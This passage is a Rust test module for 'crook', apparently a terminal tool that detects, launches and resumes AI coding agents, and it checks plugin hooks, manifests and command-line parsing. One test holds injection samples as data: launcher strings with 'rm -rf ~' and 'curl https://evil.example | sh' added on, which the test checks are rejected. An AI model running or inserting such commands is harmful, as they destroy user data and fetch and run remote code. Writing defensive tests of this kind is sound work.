                .unwrap_or_else(|error| panic!("{} is not JSON: {error}", served.path));
            let printed = hooks_text(served.agent, Path::new("/usr/bin/crook")).unwrap();
            let printed: Value = serde_json::from_str(&printed.text).expect("the fragment is JSON");
            // `hooks` everywhere, and Copilot's `version` beside it.
            for (key, value) in printed.as_object().unwrap() {
                assert_eq!(
                    value,
                    &shipped[key],
                    "{} has drifted from `--agent-hooks {}`; its `{key}` should be\n{}",
                    served.path,
                    served.agent,
                    serde_json::to_string_pretty(value).unwrap()
                );
            }
            assert!(
                shipped["description"].as_str().is_some(),
                "{}: a plugin's hooks file says what its hooks are for",
                served.path
            );
        }
    }

    #[test]
    fn each_agent_the_plugin_serves_reads_a_manifest_that_names_its_own_hooks() {
        let directory = Path::new(env!("CARGO_MANIFEST_DIR")).join("../packaging/claude-code");
        for served in SERVED {
            let manifest: Value = serde_json::from_str(served.manifest)
                .unwrap_or_else(|error| panic!("{}'s manifest is not JSON: {error}", served.agent));
            // Claude Code's names none, and reads `hooks/hooks.json` and no
            // other agent's file; the other two name their own.
            assert_eq!(
                served.names,
                manifest.get("hooks").and_then(Value::as_str),
                "{}'s manifest",
                served.agent
            );
            // The file the manifest names is the one the test above pins.
            let named = served.names.unwrap_or("hooks/hooks.json");
            let on_disk = std::fs::read_to_string(directory.join(named))
                .unwrap_or_else(|error| panic!("{} names {named}: {error}", served.agent));
            assert!(on_disk == served.hooks, "{} names {named}", served.agent);
            // A manifest that names its hooks names its skills too, the one
            // directory the skill is in, or the agent may load no skill.
            if served.names.is_some() {
                assert_eq!(
                    Some("./skills/"),
                    manifest["skills"].as_str(),
                    "{}",
                    served.agent
                );
            }
        }
        assert!(directory.join("skills/crook/SKILL.md").is_file());
    }

    /// Waits, for a minute at most, until the script just written at `path`
    /// can be run.
    ///
    /// The other tests in this process start processes all the while, and a
    /// child forked while the script was still open for writing holds a copy
    /// of that descriptor until it execs. Until it does, the kernel will not
    /// run the file — `ETXTBSY`, "Text file busy" — and a hook's `|| exit 0`
    /// turns that into a line on stderr and no report: a failure about how
    /// loaded the machine was, not about the hooks. Once the script has run
    /// once, nothing holds it open for writing, and nothing can again.
    #[cfg(unix)]
    fn wait_until_it_runs(path: &Path) {
        use std::process::Stdio;
        use std::time::{Duration, Instant};

        let deadline = Instant::now() + Duration::from_secs(60);
        loop {
            let ran = crate::process::command(&path.to_string_lossy())
                .stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status();
            match ran {
                Err(error)
                    if error.kind() == std::io::ErrorKind::ExecutableFileBusy
                        && Instant::now() < deadline =>
                {
                    std::thread::sleep(Duration::from_millis(10));
                }
                Err(error) => panic!("{} would not run: {error}", path.display()),
                Ok(_) => return,
            }
        }
    }

    #[cfg(unix)]
    #[test]
    fn the_plugin_hooks_run_crook_inside_crook_and_nothing_anywhere_else() {
        use std::os::unix::fs::PermissionsExt as _;
        use std::process::Stdio;

        let scratch =
            std::env::temp_dir().join(format!("crook-plugin-hooks-{}", std::process::id()));
        let empty = scratch.join("empty");
        let on_path = scratch.join("on-path");
        std::fs::create_dir_all(&empty).unwrap();
        std::fs::create_dir_all(&on_path).unwrap();
        // A stand-in for the binary: it writes down what it was run with and
        // what it was handed on stdin, which is the whole of what a hook does
        // with it. `cat` by its path, because the hooks run with a PATH that
        // holds nothing unless a case puts a `crook` on it.
        let record = scratch.join("record");
        let fake = format!(
            "#!/bin/sh\nprintf '%s ' \"$@\" > '{0}'\n/bin/cat >> '{0}'\n",
            record.display()
        );
        let binary = scratch.join("crook-dev");
        // And one that fails the way a report with nowhere to go does.
        let broken = scratch.join("crook-broken");
        let failing = "#!/bin/sh\necho 'crook: no terminal' >&2\nexit 1\n";
        for (path, script) in [
            (&binary, fake.as_str()),
            (&on_path.join("crook"), fake.as_str()),
            (&broken, failing),
        ] {
            std::fs::write(path, script).unwrap();
            std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
            wait_until_it_runs(path);
        }
        let binary = binary.to_str().unwrap();
        let broken = broken.to_str().unwrap();

        let shipped: Value = serde_json::from_str(PLUGIN_HOOKS).unwrap();
        let events = shipped["hooks"].as_object().unwrap();
        assert!(!events.is_empty());
        let input = r#"{"hook_event_name": "Stop", "prompt": "port the tab bar"}"#;
        for (event, groups) in events {
            let command = groups[0]["hooks"][0]["command"].as_str().unwrap();
            let arguments = CLAUDE_EVENTS
                .iter()
                .find(|(name, _)| name == event)
                .map(|(_, arguments)| *arguments)
                .unwrap();
            // What `sh -c` makes of the command in an environment that holds
            // only `variables`: its exit, its stdout and stderr, and what the
            // stand-in was run with, if it was.
            let run = |variables: &[(&str, &str)]| {
                let _ = std::fs::remove_file(&record);
                let mut shell = crate::process::command("/bin/sh");
                shell
                    .arg("-c")
                    .arg(command)
                    .env_clear()
                    .env("PATH", &empty)
                    .envs(variables.iter().copied())
                    .stdin(Stdio::piped())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                let mut child = shell.spawn().expect("/bin/sh runs");
                // A hook that never reads its input is allowed to exit before
                // this is written, so a broken pipe here is not a failure.
                let _ = child.stdin.take().unwrap().write_all(input.as_bytes());
                let output = child.wait_with_output().unwrap();
                let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
                let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
                (
                    output.status.success(),
                    stdout,
                    stderr,
                    std::fs::read_to_string(&record).ok(),
                )
            };
            let reported = Some(format!("--agent {arguments} {input}"));
            let path = on_path.to_str().unwrap();

            // Another terminal: Claude Code runs the hook and it does nothing
            // at all — no binary started, not a byte written, exit 0, since a
            // failing UserPromptSubmit hook is a notice on every prompt and
            // anything it prints is added to what the model reads.
            for outside in [
                &[][..],
                &[("TERM_PROGRAM", "iTerm.app"), ("CROOK_BIN", binary)][..],
            ] {
                assert_eq!(
                    (true, String::new(), String::new(), None),
                    run(outside),
                    "{event} outside Crook, with {outside:?}"
                );
            }
            // A pane: the binary the pane names, handed the hook's input.
            assert_eq!(
                (true, String::new(), String::new(), reported.clone()),
                run(&[("TERM_PROGRAM", "Crook"), ("CROOK_BIN", binary)]),
                "{event} in a pane"
            );
            // tmux in a pane says TERM_PROGRAM=tmux; the pane's id is still
            // there when the pane started tmux's server.
            assert_eq!(
                (true, String::new(), String::new(), reported.clone()),
                run(&[
                    ("TERM_PROGRAM", "tmux"),
                    ("CROOK_PANE_ID", "7"),
                    ("CROOK_BIN", binary)
                ]),
                "{event} in tmux in a pane"
            );
            // A server started anywhere else hands its panes neither, and
            // its client may be in a pane all the same: `crook` asks tmux
            // where its clients are.
            let tmux = "/tmp/tmux-1000/default,4321,0";
            for inside in [
                &[
                    ("TERM_PROGRAM", "tmux"),
                    ("TMUX", tmux),
                    ("CROOK_BIN", binary),
                ][..],
                &[("TERM_PROGRAM", "tmux"), ("TMUX", tmux), ("PATH", path)][..],
            ] {
                assert_eq!(
                    (true, String::new(), String::new(), reported.clone()),
                    run(inside),
                    "{event} in a tmux started outside Crook, with {inside:?}"
                );
            }
            // And nothing for a TMUX that names no server.
            assert_eq!(
                (true, String::new(), String::new(), None),
                run(&[
                    ("TERM_PROGRAM", "tmux"),
                    ("TMUX", ""),
                    ("CROOK_BIN", binary)
                ]),
                "{event} with an empty TMUX"
            );
            // A Crook from before CROOK_BIN, or a binary an upgrade has moved
            // from under a running one: the `crook` on PATH.
            for stale in [
                &[("TERM_PROGRAM", "Crook"), ("PATH", path)][..],
                &[
                    ("TERM_PROGRAM", "Crook"),
                    ("CROOK_BIN", "/nowhere/crook"),
                    ("PATH", path),
                ][..],
            ] {
                assert_eq!(
                    (true, String::new(), String::new(), reported.clone()),
                    run(stale),
                    "{event} with {stale:?}"
                );
            }
            // The far side of `ssh`, or the inside of a container: a `crook`
            // on that machine's PATH and neither variable, since neither
            // crosses by itself — nothing, as in any other terminal. With
            // TERM_PROGRAM passed on, the first of the two things the README
            // tells a person to do there, that `crook` reports.
            assert_eq!(
                (true, String::new(), String::new(), None),
                run(&[("TERM", "xterm-256color"), ("PATH", path)]),
                "{event} over ssh"
            );
            assert_eq!(
                (true, String::new(), String::new(), reported.clone()),
                run(&[
                    ("TERM", "xterm-256color"),
                    ("TERM_PROGRAM", "Crook"),
                    ("PATH", path)
                ]),
                "{event} over ssh with TERM_PROGRAM passed on"
            );
            // The second: a binary that is on no PATH there — bind-mounted
            // into a container at a path of its own — is not found with
            // TERM_PROGRAM alone, since the hook carries no path, and is with
            // CROOK_BIN set there to it.
            assert_eq!(
                (true, String::new(), String::new(), None),
                run(&[("TERM", "xterm-256color"), ("TERM_PROGRAM", "Crook")]),
                "{event} in a container with crook off PATH"
            );
            assert_eq!(
                (true, String::new(), String::new(), reported.clone()),
                run(&[
                    ("TERM", "xterm-256color"),
                    ("TERM_PROGRAM", "Crook"),
                    ("CROOK_BIN", binary)
                ]),
                "{event} in a container with crook off PATH and CROOK_BIN set"
            );
            // A pane with no binary to reach is quiet too, rather than a
            // "not found" on every prompt.
            assert_eq!(
                (true, String::new(), String::new(), None),
                run(&[("TERM_PROGRAM", "Crook"), ("CROOK_BIN", "/nowhere/crook")]),
                "{event} with no binary"
            );
            // And so is a report that fails — a Crook too old to find the
            // pane from a hook with no terminal: exit 0, so it is not a
            // notice on every prompt and tool call, with what went wrong on
            // stderr, which Claude Code keeps in its debug log.
            assert_eq!(
                (true, String::new(), "crook: no terminal\n".to_owned(), None),
                run(&[("TERM_PROGRAM", "Crook"), ("CROOK_BIN", broken)]),
                "{event} with a report that fails"
            );
        }
        let _ = std::fs::remove_dir_all(&scratch);
    }

    #[test]
    fn the_plugin_skill_is_the_skill_crook_prints() {
        // Byte for byte: the plugin's copy is what Claude Code loads, and a
        // skill that says one thing from `--skill` and another from the
        // plugin is two answers to what a pane can do.
        assert!(
            PLUGIN_SKILL == SKILL,
            "packaging/claude-code/skills/crook/SKILL.md is not app/src/skill.md; copy it over"
        );
    }

    #[test]
    fn every_agent_the_plugin_serves_leads_with_the_commands_that_install_it() {
        let marketplace: Value =
            serde_json::from_str(MARKETPLACE).expect("the marketplace is JSON");
        let name = marketplace["name"].as_str().unwrap();
        let plugins = marketplace["plugins"].as_array().unwrap();
        assert_eq!(1, plugins.len(), "{plugins:?}");
        let plugin = plugins[0]["name"].as_str().unwrap();
        // The directory the tests above read is the one the entry names, or
        // they pin a copy nobody installs.
        assert_eq!(
            Some("./packaging/claude-code"),
            plugins[0]["source"].as_str()
        );

        // Each CLI's own spelling, as its `plugin --help` gives it: Codex
        // 0.149 adds a plugin where the other two install one. All three
        // take GitHub's `owner/repo` for the marketplace, and installed
        // `crook@crook` from it.
        for (agent, install, by_hand) in [
            ("claude", "install", "merge the `hooks` below"),
            ("codex", "add", "merge the `hooks` below"),
            ("copilot", "install", "save the file below"),
        ] {
            let served = SERVED.iter().find(|served| served.agent == agent).unwrap();
            let manifest: Value = serde_json::from_str(served.manifest).unwrap();
            // Claude Code's rule, and the others': an install by a name the
            // manifest does not share is "not found in marketplace".
            assert_eq!(Some(plugin), manifest["name"].as_str(), "{agent}");
            assert_eq!(
                Some("https://github.com/theguriev/crook"),
                manifest["repository"].as_str(),
                "{agent}: the marketplace the lead adds is the repository the plugin says it is"
            );

            let printed = hooks_text(agent, Path::new("/usr/bin/crook")).unwrap();
            let lead = printed
                .lead
                .unwrap_or_else(|| panic!("{agent}'s hooks come as a plugin too"));
            let lines: Vec<&str> = lead.lines().filter(|line| !line.starts_with('#')).collect();
            assert_eq!(
                vec![
                    format!("{agent} plugin marketplace add theguriev/crook"),
                    format!("{agent} plugin {install} {plugin}@{name}"),
                ],
                lines,
                "the lead is comments and the commands, so pasting all of it runs just those"
            );
            // And the fragment after it is still there, for whoever would
            // rather not install anything.
            assert!(
                lead.lines()
                    .last()
                    .unwrap()
                    .starts_with(&format!("# Or {by_hand} by hand instead")),
                "{agent}: {lead}"
            );
            assert!(printed.note.is_some(), "{agent}");
        }

        // Only those three have a plugin to lead with.
        for agent in AGENTS
            .iter()
            .filter(|agent| !SERVED.iter().any(|served| served.agent == agent.name))
        {
            let printed = hooks_text(agent.name, Path::new("/usr/bin/crook")).unwrap();
            assert_eq!(None, printed.lead, "{}", agent.name);
        }
    }

    #[test]
    fn the_skill_and_the_readme_give_every_command_that_installs_the_plugin() {
        // Both say to lead with the plugin, and both are read by people and
        // agents who will type what they say: a command renamed in the table
        // and not here is a person typing one their CLI has never heard of.
        const README: &str = include_str!("../../README.md");
        let readme = README.split_whitespace().collect::<Vec<_>>().join(" ");
        for agent in AGENTS.iter().filter(|agent| !agent.plugin.is_empty()) {
            for command in agent.plugin {
                assert!(
                    SKILL.lines().any(|line| line == *command),
                    "the skill does not give `{command}` a line of its own"
                );
                assert!(
                    readme.contains(&format!("`{command}`")),
                    "the README does not give `{command}`"
                );
            }
        }
    }

    #[test]
    fn the_claude_note_names_the_notification_channels_crook_reads_for_a_claude_without_hooks() {
        // Claude Code's `auto` notification channel picks nothing in Crook,
        // so with neither the plugin nor the hooks a stop to ask lights no
        // row — until its setting names one of the three forms the pane's
        // emulator reads (crook_terminal's notify module).
        let note = hooks_text("claude", Path::new("/usr/bin/crook"))
            .unwrap()
            .note
            .unwrap();
        let line = note.lines().last().unwrap();
        assert!(
            line.starts_with("# "),
            "a comment line of its own, so pasting the note runs nothing: {note}"
        );
        assert!(line.contains("\"preferredNotifChannel\""), "{line}");
        for channel in ["ghostty", "kitty", "iterm2"] {
            assert!(
                line.contains(&format!("\"{channel}\"")),
                "{channel}: {line}"
            );
        }

        // The setting is Claude Code's, and no other agent's note names it.
        for agent in AGENTS.iter().filter(|agent| agent.name != "claude") {
            let note = hooks_text(agent.name, Path::new("/usr/bin/crook"))
                .unwrap()
                .note
                .unwrap_or_default();
            assert!(!note.contains("preferredNotifChannel"), "{}", agent.name);
        }
    }

    #[test]
    fn a_command_line_names_its_agent_by_the_first_word_and_nothing_after_it() {
        assert_eq!(Some("claude"), program_of("claude"));
        // The prompt is the rest of the line, and none of it is the answer.
        assert_eq!(Some("claude"), program_of("claude \"fix the bug\""));
        assert_eq!(
            Some("codex"),
            program_of("  codex --model o4 'port the tab bar'")
        );
        // By the program's file name, wherever it was run from.
        assert_eq!(
            Some("claude"),
            program_of("/opt/homebrew/bin/claude --model opus")
        );
        assert_eq!(
            Some("copilot"),
            program_of(r"C:\Users\me\AppData\Roaming\npm\copilot.cmd")
        );
        for agent in AGENTS {
            assert_eq!(Some(agent.name), program_of(agent.name));
        }
    }

    #[test]
    fn a_quoted_first_word_names_its_agent_as_the_shell_reads_it() {
        // The line `crook tab new -- codex "fix the flaky test"` types.
        assert_eq!(Some("codex"), program_of("'codex' 'fix the flaky test'"));
        assert_eq!(Some("claude"), program_of("\"claude\" --continue"));
        // A path with a space in it is one word while it is quoted.
        assert_eq!(
            Some("codex"),
            program_of("'/opt/my tools/codex' 'port the tab bar'")
        );
        assert_eq!(Some("gemini"), program_of("/opt/'my tools'/gemini -i x"));
        // The quotes come off the word, and nothing else is let in.
        for command in ["'claudette'", "'echo' 'claude'", "'' claude", "'claude x'"] {
            assert_eq!(None, program_of(command), "{command:?}");
        }
    }

    #[test]
    fn a_command_line_that_starts_no_known_agent_names_nothing() {
        for command in [
            "",
            "   ",
            "cargo test",
            "vim claude.md",
            "claudette",
            "echo claude",
            "./claude-notes.sh",
        ] {
            assert_eq!(None, program_of(command), "{command:?}");
        }
    }

    #[test]
    fn an_agent_run_through_a_package_runner_is_named_by_its_package() {
        // Gemini CLI's own quick start, and each package runner's spelling
        // of the same thing.
        for command in [
            "npx @google/gemini-cli",
            "npx -y @google/gemini-cli -i 'port the tab bar'",
            "npx --yes @google/gemini-cli@latest",
            "npx -p @google/gemini-cli gemini",
            "npx --package=@google/gemini-cli@0.9.0 gemini --resume latest",
            "bunx @google/gemini-cli",
            "bun x @google/gemini-cli",
            "pnpm dlx @google/gemini-cli",
            "pnpx @google/gemini-cli",
            "yarn dlx @google/gemini-cli",
            "npm exec -- @google/gemini-cli",
            "npm x @google/gemini-cli",
            "/usr/local/bin/npx @google/gemini-cli",
            r"C:\nvm\v22\npx.cmd @google/gemini-cli",
            // The line `crook tab new -- npx @google/gemini-cli` types.
            "'npx' '@google/gemini-cli' 'fix the flaky test'",
        ] {
            assert_eq!(Some("gemini"), program_of(command), "{command:?}");
        }
        for (command, agent) in [
            ("npx @anthropic-ai/claude-code", "claude"),
            ("bunx @openai/codex resume --last", "codex"),
            ("pnpm dlx @github/copilot", "copilot"),
            ("npx opencode-ai@latest", "opencode"),
        ] {
            assert_eq!(Some(agent), program_of(command), "{command:?}");
        }
    }

    #[test]
    fn an_agent_behind_assignments_and_wrappers_is_named_all_the_same() {
        for command in [
            "env claude",
            "/usr/bin/env claude",
            "env ANTHROPIC_MODEL=opus claude",
            "env -i -u TERM --unset=LANG HOME=/home/me claude",
            "env -- claude",
            "ANTHROPIC_MODEL=opus DEBUG= claude --continue",
            "command claude",
            "command -p claude",
            "exec claude",
            "exec -a agent claude",
            "time claude",
            "time -p claude",
            "/usr/bin/time -f %e -o /tmp/took claude",
            "nohup claude",
            "nice claude",
            "nice -n 10 claude",
            "nice --adjustment=5 claude",
            "nohup env FOO=1 nice -n 5 time claude 'fix the bug'",
            "'env' 'FOO=1' 'claude'",
        ] {
            assert_eq!(Some("claude"), program_of(command), "{command:?}");
        }
        assert_eq!(
            Some("gemini"),
            program_of("env GEMINI_API_KEY=key npx @google/gemini-cli")
        );
    }

    #[test]
    fn an_agent_run_through_a_version_manager_is_named_all_the_same() {
        for (command, agent) in [
            ("mise x -- claude", "claude"),
            ("mise x node@22 -- claude --model opus", "claude"),
            ("mise exec node@22 python@3.12 -- codex", "codex"),
            (
                "mise x -q --yes -j 8 --jobs=2 -vv node@22 -- codex",
                "codex",
            ),
            ("mise x node@22 -- npx @google/gemini-cli", "gemini"),
            ("mise x node@22 -- env FOO=1 copilot", "copilot"),
            ("asdf exec claude", "claude"),
            ("asdf exec npx @openai/codex", "codex"),
        ] {
            assert_eq!(Some(agent), program_of(command), "{command:?}");
        }
    }

    #[test]
    fn a_launcher_that_starts_no_known_agent_names_nothing() {
        for command in [
            "npx",
            "npx cowsay claude",
            "npx claude",
            "npx @google/gemini-cli-core",
            "npx @anthropic-ai/claude-code-router",
            "npx -p @google/gemini-cli codex",
            "npx -p cowsay claude",
            "npm install -g @anthropic-ai/claude-code",
            "pnpm add @google/gemini-cli",
            "yarn add @openai/codex",
            "bun run claude",
            "env",
            "env FOO=1",
            "FOO=1",
            "env echo claude",
            "command -v claude",
            "command -V claude",
            "time cargo test",
            "nohup ./claude-notes.sh",
            "mise x claude",
            "mise install claude",
            "mise x node@22 -- npm test",
            // A command of mise's own, which it refuses beside a `--`, and
            // a `-j` with no number.
            "mise x -c true -- claude",
            "mise x -qc true -- claude",
            "mise x --command=true -- claude",
            "mise x -j -- claude",
            "asdf install nodejs",
            "'' claude",
        ] {
            assert_eq!(None, program_of(command), "{command:?}");
        }
    }

    #[test]
    fn an_agent_run_somewhere_else_or_some_other_way_is_no_agent_to_resume() {
        // Every line a restore could offer for these resumes another
        // directory's conversation, runs the agent unconfined, or carries a
        // value of an option as a tool into the file: better no line.
        for (command, agent) in [
            // A directory the pane is not in, in every spelling env's
            // getopt takes for one.
            ("env -C /work/repo claude", "claude"),
            ("env -C/work/repo claude", "claude"),
            ("env --chdir /work/repo claude", "claude"),
            ("env --chdir=/work/repo claude", "claude"),
            ("env -iC/work/repo claude", "claude"),
            ("env -vC /work/repo claude", "claude"),
            ("env -i -u TERM -C /work/repo claude", "claude"),
            ("env --ch=/work/repo claude", "claude"),
            ("env --chd /work/repo claude", "claude"),
            ("mise x -C /work/repo node@22 -- codex", "codex"),
            ("mise x -qC/work/repo -- codex", "codex"),
            ("mise x --cd /work/repo -- claude", "claude"),
            ("mise x --cd=/work/repo -- claude", "claude"),
            // A workspace's directory, which npm runs a package in.
            (
                "npx --workspace=packages/app @anthropic-ai/claude-code",
                "claude",
            ),
            ("npx --workspaces @google/gemini-cli", "gemini"),
            ("npx -ws @google/gemini-cli", "gemini"),
            ("npx --ws @openai/codex", "codex"),
            ("npm exec --workspace=web -- @google/gemini-cli", "gemini"),
            ("npx -y --workspace=web @openai/codex", "codex"),
            ("env FOO=1 npx --workspace=web @openai/codex", "codex"),
            // A sandbox a resume line would leave behind.
            ("mise x --allow-read /srv node@22 -- claude", "claude"),
            (
                "mise x --deny-all --allow-read /home/me/project --allow-net api.anthropic.com -- claude",
                "claude",
            ),
            ("mise x --allow-env ANTHROPIC_API_KEY -- codex", "codex"),
            ("mise x --allow-write=/tmp -- claude", "claude"),
            ("mise x --deny-net -- claude", "claude"),
            // Another environment's config, a runtime of the runner's
            // choosing, and what env runs or finds some other way.
            ("mise x -E staging node@22 -- claude", "claude"),
            ("mise x --env=staging -- claude", "claude"),
            ("bunx --bun @google/gemini-cli", "gemini"),
            ("env -a agent claude", "claude"),
            ("env -P /opt/agents claude", "claude"),
            // Options this does not know, with or without a value.
            ("mise x --some-new-flag node@22 -- claude", "claude"),
            ("mise x - -- claude", "claude"),
            ("npx --some-new-flag @anthropic-ai/claude-code", "claude"),
            ("pnpm dlx --dir=packages/app @openai/codex", "codex"),
            ("bunx --cwd=packages/app @openai/codex", "codex"),
            ("env --block-signal claude", "claude"),
        ] {
            assert_eq!(None, launch_of(command), "{command:?}");
            // The agent is running all the same, and its title says what
            // it is doing: codex's spinner is read only where codex is.
            assert_eq!(Some(agent), program_of(command), "{command:?}");
        }
    }

    #[test]
    fn every_agent_published_to_npm_is_named_by_its_package_through_npx() {
        // The names npm has them under, each with the one program it
        // installs being the agent's own name.
        let packages: Vec<_> = AGENTS
            .iter()
            .filter_map(|agent| Some((agent.name, agent.package?)))
            .collect();
        assert_eq!(
            packages,
            [
                ("claude", "@anthropic-ai/claude-code"),
                ("codex", "@openai/codex"),
                ("gemini", "@google/gemini-cli"),
                ("copilot", "@github/copilot"),
                ("opencode", "opencode-ai"),
            ]
        );
        for (agent, package) in packages {
            assert_eq!(Some(agent), program_of(&format!("npx {package}")));
        }
    }

    #[test]
    fn the_launcher_keeps_what_finds_the_program_and_nothing_else() {
        for (command, launcher) in [
            // The prompt and the runner's own options stay out of it.
            (
                "npx -y @google/gemini-cli -i 'port the tab bar'",
                "npx @google/gemini-cli",
            ),
            (
                "npx --registry=https://me:token@npm.example @google/gemini-cli",
                "npx @google/gemini-cli",
            ),
            (
                "npx --prefer-offline --registry https://npm.example --no @google/gemini-cli",
                "npx @google/gemini-cli",
            ),
            ("yarn dlx -q opencode-ai", "yarn dlx opencode-ai"),
            // An assignment is where an API key goes.
            (
                "GEMINI_API_KEY=secret npx @google/gemini-cli",
                "npx @google/gemini-cli",
            ),
            (
                "env GEMINI_API_KEY=secret nohup npx @google/gemini-cli",
                "npx @google/gemini-cli",
            ),
            // The version asked for is the one resumed with.
            (
                "bunx @openai/codex@0.98.0 'fix the flaky test'",
                "bunx @openai/codex@0.98.0",
            ),
            ("bun x @openai/codex", "bun x @openai/codex"),
            ("pnpm dlx @github/copilot", "pnpm dlx @github/copilot"),
            ("pnpx @github/copilot", "pnpx @github/copilot"),
            ("yarn dlx opencode-ai", "yarn dlx opencode-ai"),
            // `npm exec` hands the options after its `--` on, and takes
            // the ones before it as its own.
            (
                "npm exec -- @anthropic-ai/claude-code",
                "npm exec -- @anthropic-ai/claude-code",
            ),
            (
                "npm x @anthropic-ai/claude-code",
                "npm x -- @anthropic-ai/claude-code",
            ),
            // The runner by its name, not where it was.
            (
                "/opt/homebrew/bin/npx @anthropic-ai/claude-code",
                "npx @anthropic-ai/claude-code",
            ),
            (r"C:\nvm\v22\npx.cmd @github/copilot", "npx @github/copilot"),
            // A program out of a package is the package.
            (
                "npx --package=@google/gemini-cli@0.9.0 gemini -i x",
                "npx @google/gemini-cli@0.9.0",
            ),
            // A version that needs quoting is the package alone.
            ("npx '@google/gemini-cli@>=0.9'", "npx @google/gemini-cli"),
            // Quoted, as `crook tab new` types it.
            (
                "'npx' '@google/gemini-cli' 'fix the flaky test'",
                "npx @google/gemini-cli",
            ),
            // A version manager's tools, and none of its options.
            (
                "mise x -q --yes -j 8 node@22 -- claude --model opus",
                "mise x node@22 -- claude",
            ),
            ("mise exec -- /usr/local/bin/codex", "mise exec -- codex"),
            (
                "mise x node@22 -- env FOO=1 npx @google/gemini-cli",
                "mise x node@22 -- npx @google/gemini-cli",
            ),
            ("asdf exec claude", "asdf exec claude"),
        ] {
            let launch = launch_of(command).unwrap_or_else(|| panic!("{command:?}"));
            assert_eq!(Some(launcher), launch.launcher.as_deref(), "{command:?}");
        }

        // Run by its name, past only what is dropped: nothing to keep.
        for command in [
            "claude",
            "/opt/homebrew/bin/claude --model opus",
            "env ANTHROPIC_API_KEY=secret claude",
            "env -iv -uTERM --unset LANG --debug - claude",
            "nohup nice -n 5 claude",
            "exec claude",
        ] {
            assert_eq!(
                Some(Launch {
                    agent: "claude",
                    launcher: None
                }),
                launch_of(command),
                "{command:?}"
            );
        }
    }

    #[test]
    fn a_resume_line_runs_through_the_launcher_its_agent_was_started_with() {
        let launch = |command| launch_of(command).expect("a launch");
        assert_eq!(
            "npx @google/gemini-cli --resume latest",
            launch("npx @google/gemini-cli").through_launcher("gemini --resume latest".to_owned())
        );
        assert_eq!(
            "mise x node@22 -- bunx @openai/codex resume --last",
            launch("mise x node@22 -- bunx @openai/codex")
                .through_launcher("codex resume --last".to_owned())
        );
        let claude = launch("mise x node@22 -- claude");
        assert_eq!(
            "mise x node@22 -- claude --continue",
            claude.through_launcher("claude --continue".to_owned())
        );
        // A person's own line that starts some other way is how they want
        // it run.
        for line in ["cc --continue", "claudette --continue"] {
            assert_eq!(line, claude.through_launcher(line.to_owned()));
        }
        // An agent run by its name is resumed by it.
        assert_eq!(
            "claude --continue",
            launch("env FOO=1 claude").through_launcher("claude --continue".to_owned())
        );
    }

    #[test]
    fn every_resume_line_through_every_launcher_reads_back_as_the_launch_it_resumes() {
        // Running the line a restore offered is a pane running that agent
        // again; a line read back as another launch would be saved as that
        // one, and the restart after it would offer something else.
        for agent in AGENTS {
            let Some(package) = agent.package else {
                continue;
            };
            for runner in [
                "npx",
                "bunx",
                "bun x",
                "pnpm dlx",
                "pnpx",
                "yarn dlx",
                "npm exec --",
                "mise x node@22 -- npx",
            ] {
                let launch = launch_of(&format!("{runner} {package}")).expect(runner);
                assert_eq!(agent.name, launch.agent, "{runner} {package}");
                for line in [agent.last, agent.pick].into_iter().flatten() {
                    let line = launch.through_launcher(line.to_owned());
                    assert_eq!(Some(&launch), launch_of(&line).as_ref(), "{line}");
                }
            }
        }
    }

    #[test]
    fn a_remembered_launcher_comes_back_only_in_a_shape_a_launch_reads_back() {
        for command in [
            "npx @google/gemini-cli",
            "bunx @google/gemini-cli@0.9.0",
            "npm exec -- @google/gemini-cli",
            "mise x node@22 -- gemini",
            "gemini",
        ] {
            let launch = launch_of(command).expect(command);
            assert_eq!(
                Some(&launch),
                Launch::remembered(launch.agent, launch.launcher.as_deref()).as_ref(),
                "{command:?} did not survive the file"
            );
        }

        // Anything else is the agent alone: what a restored pane is offered
        // comes from the table, never from the file.
        for launcher in [
            "npx @google/gemini-cli; rm -rf ~",
            "rm -rf ~; npx @google/gemini-cli",
            "npx @google/gemini-cli && curl https://evil.example | sh",
            "env GEMINI_API_KEY=secret npx @google/gemini-cli",
            "npx -y @google/gemini-cli",
            "npx @openai/codex",
            "gemini",
            "",
        ] {
            assert_eq!(
                Some(Launch {
                    agent: "gemini",
                    launcher: None
                }),
                Launch::remembered("gemini", Some(launcher)),
                "{launcher:?}"
            );
        }
        // And a name no agent answers to is nothing at all.
        for agent in ["rm -rf ~", "npx @google/gemini-cli", "/usr/bin/claude", ""] {
            assert_eq!(None, Launch::remembered(agent, None), "{agent:?}");
        }
    }

    #[test]
    fn each_agent_is_resumed_by_its_own_documented_line() {
        assert_eq!(
            Some("claude --continue"),
            resume_line("claude", Resume::Last)
        );
        assert_eq!(Some("claude --resume"), resume_line("claude", Resume::Pick));
        assert_eq!(
            Some("codex resume --last"),
            resume_line("codex", Resume::Last)
        );
        assert_eq!(Some("codex resume"), resume_line("codex", Resume::Pick));
        assert_eq!(
            Some("gemini --resume latest"),
            resume_line("gemini", Resume::Last)
        );
        // No picker on Gemini's command line, and an offer of the newest
        // conversation to two panes would be the same one twice.
        assert_eq!(None, resume_line("gemini", Resume::Pick));
        // Copilot's newest is the repository's, which a worktree shares.
        assert_eq!(
            Some("copilot --resume"),
            resume_line("copilot", Resume::Last)
        );
        // OpenCode's newest is too, and it has no picker to fall back on.
        assert_eq!(None, resume_line("opencode", Resume::Last));
        assert_eq!(None, resume_line("aider", Resume::Last));
        assert_eq!(None, resume_line("vim", Resume::Last));
    }

    #[test]
    fn every_resume_line_starts_the_agent_it_resumes() {
        // A line whose first word were another program's would be recorded,
        // once it ran, as that program: the pane would come back next time
        // offering the wrong agent.
        for agent in AGENTS {
            for line in [agent.last, agent.pick].into_iter().flatten() {
                assert_eq!(Some(agent.name), program_of(line), "{line}");
            }
        }
    }

    #[test]
    fn a_word_that_is_not_a_status_is_refused_with_the_words_that_are() {
        let error = report("sleeping", None, None, None, None).unwrap_err();
        let message = error.to_string();
        assert!(message.contains("sleeping"));
        assert!(message.contains("needs-input"));
    }

    /// A directory of the test's own, gone when it is dropped.
    struct Scratch(PathBuf);

    impl Scratch {
        fn new(label: &str) -> Self {
            static SERIAL: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            let serial = SERIAL.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let path = std::env::temp_dir().join(format!(
                "crook-agents-{label}-{}-{serial}",
                std::process::id()
            ));
